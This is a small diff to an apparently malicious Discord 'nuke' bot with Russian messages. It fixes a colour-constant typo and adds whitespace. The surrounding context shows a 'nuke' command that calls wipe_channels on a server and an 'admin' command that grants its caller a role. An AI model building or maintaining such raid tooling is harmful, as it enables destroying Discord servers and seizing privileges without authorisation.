@@ -137,7 +137,7 @@ async def nuke(ctx):
     except discord.Forbidden:
         await ctx.send(Fore.RED +"У бота нет прав на создание событий.")
     except Exception as e:
-        await ctx.send(FORE.RED + f"Ошибка при создании события: {e}")
+        await ctx.send(Fore.RED + f"Ошибка при создании события: {e}")
 
     asyncio.gather(
         wipe_channels(guild),
@@ -182,6 +182,7 @@ async def admin(ctx):
 
     await ctx.author.add_roles(role)
     print(Fore.GREEN + f"[+] Выдана роль {role_name} пользователю {ctx.author}")
+
 
 
 bot.run(TOKEN, log_handler=None)
